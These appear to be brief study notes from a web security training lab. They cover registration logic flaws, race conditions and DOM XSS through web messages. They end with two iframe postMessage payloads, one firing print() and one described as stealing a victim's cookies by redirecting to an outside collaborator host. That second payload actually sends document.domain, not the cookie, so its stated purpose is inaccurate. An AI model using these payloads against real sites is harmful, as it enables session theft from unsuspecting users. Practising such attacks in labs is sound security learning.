## _**Account Registeration Functionality**_

### * **Application Logic**
- Bypassing access controls using email address parsing discrepancies
### * **Race Conditions**
- Partial construction race conditions
## _**addEventListener() located in app respone**_
- DOM XSS using web messages
- DOM XSS using web messages and a JavaScript URL
- **_DOM XSS using web messages and JSON.parse_**

Tip: In this lab we used this payload to fire the print() function.

```
 <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

However if we want to steal the victim's cookies instead, we can use this payload.

```
 <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"JavaScript:location=`https://COLLAB-ID.oastify.com?cookie=`+document.domain\"}","*")'>
```